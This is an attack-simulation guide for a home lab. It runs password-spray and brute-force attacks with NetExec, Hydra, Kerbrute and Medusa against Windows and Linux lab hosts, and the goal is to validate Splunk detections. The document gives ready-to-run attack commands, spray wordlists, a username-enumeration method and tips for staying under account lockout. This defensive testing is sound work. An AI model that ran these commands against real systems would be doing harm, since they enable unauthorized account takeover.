# Attack Simulation Guide — Kali Linux
## Credential Attack Lab: Brute Force & Password Spray

**Attacker:** Kali Linux (lab VM)
**Targets:** Windows Server / Windows workstation, Ubuntu/RHEL Linux host
**Purpose:** Generate realistic authentication log data to validate Splunk detections
**Authorization:** Isolated home lab only — never run against systems you do not own

---

## Lab Topology

```
┌─────────────────────────────────────────────────────────────────┐
│  Home Lab Network (e.g., 192.168.10.0/24)                       │
│                                                                  │
│  ┌───────────────┐        ┌──────────────────────────────────┐  │
│  │  Kali Linux   │───────▶│  Windows Server / Workstation    │  │
│  │  (Attacker)   │        │  (Target — logs to Splunk)       │  │
│  │  192.168.10.5 │        │  192.168.10.10                   │  │
│  └───────────────┘        └──────────────────────────────────┘  │
│         │                                                        │
│         │                 ┌──────────────────────────────────┐  │
│         └────────────────▶│  Linux Host (Ubuntu/RHEL)        │  │
│                           │  (Target — logs to Splunk)       │  │
│                           │  192.168.10.20                   │  │
│                           └──────────────────────────────────┘  │
│                                                                  │
│                           ┌──────────────────────────────────┐  │
│                           │  Splunk (SIEM)                   │  │
│                           │  192.168.10.100                  │  │
│                           │  Receives logs from both targets │  │
│                           └──────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Wordlists and User Lists

Before running any attack, prepare these files on Kali:

### users.txt — target usernames for spray

```bash
# Save this as ~/lab/users.txt
cat > ~/lab/users.txt << 'EOF'
jsmith
mjones
awhite
rbrown
klee
tgarcia
dwilson
cmartinez
sthompson
phenderson
administrator
EOF
```

### linux-users.txt — Linux service accounts commonly targeted

```bash
cat > ~/lab/linux-users.txt << 'EOF'
root
ubuntu
deploy
backup
postgres
ansible
jenkins
git
nagios
zabbix
svc-monitor
EOF
```

### spray-passwords.txt — common spray passwords (1–3 per campaign)

```bash
cat > ~/lab/spray-passwords.txt << 'EOF'
Summer2024!
Welcome1!
Password1
Company2024!
January2024!
EOF
```

---

## Windows Attacks

### Tool: NetExec (formerly CrackMapExec)

NetExec is the primary tool for Windows credential attacks from Kali. It authenticates over SMB, which generates **EventCode 4625 with LogonType 3** on the target — exactly what the Splunk detections look for.

```bash
# Install / update
sudo apt update && sudo apt install -y netexec
# Or: pip3 install netexec
```

---

#### Windows Password Spray — SMB

Tries one password against all users. The `--continue-on-success` flag keeps going after a hit to find all valid accounts.

```bash
netexec smb 192.168.10.10 \
  -u ~/lab/users.txt \
  -p 'Summer2024!' \
  --continue-on-success \
  --no-bruteforce
```

**What it generates in Windows Security Event Log:**
- EventCode `4625` (LogonType 3) for each failure
- EventCode `4624` (LogonType 3) if a password matches
- One event per username → unique_accounts rises, failure_count stays low per user

**Expected Splunk output (password-spray.spl):**
```
src_ip: 192.168.10.5 | unique_accounts: 11 | failure_count: 11 | avg_attempts_per_account: 1.0
detection: Password Spray (Low-and-Slow) | severity: High
```

**Spray multiple passwords with delay (realistic slow spray):**
```bash
# Iterate through passwords with 30-second delay between rounds
for password in 'Summer2024!' 'Welcome1!' 'Password1'; do
  echo "[*] Spraying: $password"
  netexec smb 192.168.10.10 \
    -u ~/lab/users.txt \
    -p "$password" \
    --continue-on-success \
    --no-bruteforce
  echo "[*] Sleeping 30s before next password..."
  sleep 30
done
```

---

#### Windows Brute Force — SMB (single account)

Hammers one account with many passwords. Use a small wordlist for the lab — you don't need 14M entries to trigger the detection.

```bash
# Create a small wordlist
cat > ~/lab/bf-passwords.txt << 'EOF'
123456
password
letmein
welcome
Password1
Summer2023!
Summer2024!
admin123
qwerty
abc123
Password123!
Passw0rd!
EOF

netexec smb 192.168.10.10 \
  -u administrator \
  -p ~/lab/bf-passwords.txt
```

**What it generates:**
- EventCode `4625` (LogonType 3) — one per failed password, all targeting `administrator`
- If the real password is in the list: EventCode `4624` follows

**Expected Splunk output (brute-force.spl):**
```
TargetUserName: administrator | failure_count: 12 | unique_sources: 1
detection: Windows Brute Force | severity: Medium
```

---

#### Windows Brute Force — RDP (generates LogonType 10)

Hydra targets RDP on port 3389. Make sure RDP is enabled on the target (Server Manager → Remote Desktop or `Enable-PSRemoting`).

```bash
hydra -l administrator \
  -P ~/lab/bf-passwords.txt \
  rdp://192.168.10.10 \
  -t 4 \
  -V
```

**What it generates:**
- EventCode `4625` with **LogonType 10** (RemoteInteractive)
- Triggers the `LogonType IN (3, 7, 10)` filter in both Windows detections

---

#### Windows Spray — Kerberos (Domain environments only)

Kerbrute performs pre-authentication spray that generates **EventCode 4771** on the Domain Controller instead of 4625. Useful for understanding Kerberos-based attack paths.

```bash
# Install kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute

# Spray against the domain
kerbrute passwordspray \
  -d corp.local \
  --dc 192.168.10.10 \
  ~/lab/users.txt \
  'Summer2024!'
```

**Splunk note:** Kerbrute spray generates EventCode `4771` (Kerberos pre-auth failure), not `4625`. Extend the Windows spray detection to also include:
```splunk
index=wineventlog (EventCode=4625 OR EventCode=4771)
```

---

## Linux SSH Attacks

### Tool: Hydra

Hydra is the standard SSH brute force and spray tool. Each attempt hits `/var/log/auth.log` or `/var/log/secure` on the target.

```bash
sudo apt install -y hydra
```

---

#### Linux SSH Brute Force

Many passwords against one account. The `-t 4` flag limits parallel tasks to avoid connection resets; `-V` shows each attempt.

```bash
hydra -l root \
  -P ~/lab/bf-passwords.txt \
  ssh://192.168.10.20 \
  -t 4 \
  -V
```

**What it generates in /var/log/auth.log:**
```
Failed password for root from 192.168.10.5 port XXXXX ssh2
Failed password for root from 192.168.10.5 port XXXXX ssh2
...
Accepted password for root from 192.168.10.5 port XXXXX ssh2  ← if password found
```

**Expected Splunk output (linux/brute-force.spl):**
```
src_ip: 192.168.10.5 | failure_count: 12 | unique_users_targeted: 1
detection: Linux SSH Brute Force | severity: Medium
```

---

#### Linux SSH Password Spray

One password against many accounts. The `-L` (capital) flag takes a user list; `-p` (lowercase) takes a single password.

```bash
hydra -L ~/lab/linux-users.txt \
  -p 'Welcome1!' \
  ssh://192.168.10.20 \
  -t 4 \
  -V
```

**What it generates:**
```
Failed password for deploy from 192.168.10.5 port XXXXX ssh2
Failed password for backup from 192.168.10.5 port XXXXX ssh2
Failed password for postgres from 192.168.10.5 port XXXXX ssh2
...
```

**Expected Splunk output (linux/password-spray.spl):**
```
src_ip: 192.168.10.5 | unique_accounts: 11 | avg_attempts_per_account: 1.0
detection: SSH Password Spray (Classic Low-and-Slow) | severity: High
```

---

#### Linux Username Enumeration + Targeted Brute Force (two-phase attack)

Phase 1 — Enumerate which usernames exist on the system, then pivot to brute forcing the valid ones.

```bash
# Phase 1: Probe for valid usernames
# "Invalid user" in auth.log = account doesn't exist
# No "Invalid user" = account exists (only "Failed password" appears)
cat > ~/lab/common-usernames.txt << 'EOF'
admin
test
oracle
ftp
webmaster
mysql
tomcat
user
guest
pi
deploy
ubuntu
EOF

# Attempt login with a dummy password to enumerate
hydra -L ~/lab/common-usernames.txt \
  -p 'UNLIKELY_DUMMY_PASSWORD_XYZ' \
  ssh://192.168.10.20 \
  -t 4 \
  -V 2>&1 | grep -v "ATTEMPT"
```

Phase 2 — Once you identify `deploy` exists (no "Invalid user" in the log):

```bash
# Phase 2: Focused brute force on confirmed-valid account
hydra -l deploy \
  -P ~/lab/bf-passwords.txt \
  ssh://192.168.10.20 \
  -t 4 \
  -V
```

**What Phase 1 generates in auth.log:**
```
Invalid user admin from 192.168.10.5 port XXXXX
Invalid user test from 192.168.10.5 port XXXXX
Failed password for deploy from 192.168.10.5 port XXXXX   ← "deploy" exists
Invalid user ubuntu from 192.168.10.5 port XXXXX
```

**Splunk note:** The `invalid_user_pct` field in `linux/brute-force.spl` scores this pattern. When most attempts hit non-existent users, it flags "Majority targeting non-existent users — likely username enumeration combined with brute force."

---

#### Linux Spray with Medusa (alternative to Hydra)

```bash
sudo apt install -y medusa

medusa -H ~/lab/target-hosts.txt \
  -U ~/lab/linux-users.txt \
  -p 'Summer2024!' \
  -M ssh \
  -t 2 \
  -v 4
```

Medusa is useful when you want to spray across **multiple hosts simultaneously** — it generates the `unique_hosts > 1` signal in the Linux spray detection, which is flagged as a critical indicator of internal pivoting.

---

## Verification: Confirming Detections Fire

After running each attack, run the corresponding SPL in Splunk to confirm the detection triggers:

### Quick verification query — all failures last 15 minutes

```splunk
index=wineventlog EventCode=4625 earliest=-15m
| stats count by src_ip, TargetUserName, ComputerName
| sort -count
```

```splunk
index=linux_secure ("Failed password" OR "Invalid user") earliest=-15m
| rex field=_raw "from (?P<src_ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
| stats count by src_ip, host
| sort -count
```

### Confirm a spray hit (Windows)

```splunk
index=wineventlog EventCode=4624 LogonType=3 src_ip="192.168.10.5" earliest=-15m
| table _time, TargetUserName, ComputerName, src_ip
```

### Confirm a brute force success (Linux)

```splunk
index=linux_secure ("Accepted password" OR "Accepted publickey") src_ip="192.168.10.5" earliest=-15m
| rex field=_raw "Accepted \S+ for (?P<user>\S+) from (?P<src_ip>\S+)"
| table _time, user, src_ip, host
```

---

## Operational Security Notes (for the attacker simulation)

- Slow spray (1 attempt per account per 20–30 seconds) evades per-account lockout on most default Windows policies (lockout after 5 failures within 30 minutes)
- Hydra `-t 1` (single thread) produces the most realistic low-and-slow SSH spray — `-t 4` or higher is more realistic for a brute force
- A real attacker would rotate source IPs; in this lab, Kali's single IP makes detection straightforward and validates the queries
- The presence of the attacking IP in both `4625` and `4624` events (failure then success) is the strongest indicator to pivot on during triage

---

## Attack-to-Log-to-Detection Map

| Attack | Tool | Protocol | Log Location | EventCode / Pattern | Detection File |
|---|---|---|---|---|---|
| Win Password Spray | netexec | SMB | Security Event Log | 4625 (LogonType 3) | `windows/password-spray.spl` |
| Win Brute Force | netexec / hydra | SMB | Security Event Log | 4625 (LogonType 3) | `windows/brute-force.spl` |
| Win RDP Brute Force | hydra | RDP | Security Event Log | 4625 (LogonType 10) | `windows/brute-force.spl` |
| Win Kerberos Spray | kerbrute | Kerberos | Security Event Log | 4771 | `windows/password-spray.spl` |
| Linux SSH Brute Force | hydra / medusa | SSH | /var/log/auth.log | Failed password | `linux/brute-force.spl` |
| Linux SSH Spray | hydra / medusa | SSH | /var/log/auth.log | Failed password | `linux/password-spray.spl` |
| Linux User Enum | hydra | SSH | /var/log/auth.log | Invalid user | `linux/brute-force.spl` |
